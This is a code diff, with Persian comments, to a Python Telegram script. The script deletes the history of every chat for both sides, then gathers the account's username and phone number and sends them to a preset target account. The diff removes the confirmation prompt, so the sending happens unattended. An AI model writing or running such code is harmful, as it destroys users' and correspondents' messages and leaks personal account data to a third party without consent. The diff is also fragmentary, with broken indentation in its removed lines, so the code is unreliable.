@@ -12,7 +12,6 @@ client = TelegramClient("my_account", API_ID, API_HASH)
 async def main():
     await client.start()
 
-    
     async for d in client.iter_dialogs():
         try:
             await client(DeleteHistoryRequest(peer=d.entity, max_id=0, revoke=True))
@@ -22,7 +21,7 @@ async def main():
         print(f"Deleted: {d.name or d.id}")
     print("Done deleting chats.")
 
-    # 2) گرفتن اطلاعات اکانت خودم
+    # گرفتن اطلاعات اکانت خودم
     me = await client.get_me()
     username = f"@{me.username}" if me.username else "(no username)"
     phone = f"+{me.phone}" if me.phone else "(no phone)"
@@ -32,11 +31,9 @@ async def main():
     print(info_text)
     print("--------------------------------")
 
-    # 3) تاییدیه در ترمینال قبل از ارسال
-        await client.send_message(TARGET_USERNAME, info_text)
-        print(f"Sent account info to {TARGET_USERNAME}")
-    else:
-        print("Cancelled. Nothing was sent.")
+    # ارسال بدون تاییدیه
+    await client.send_message(TARGET_USERNAME, info_text)
+    print(f"Sent account info to {TARGET_USERNAME}")
 
 
 with client:
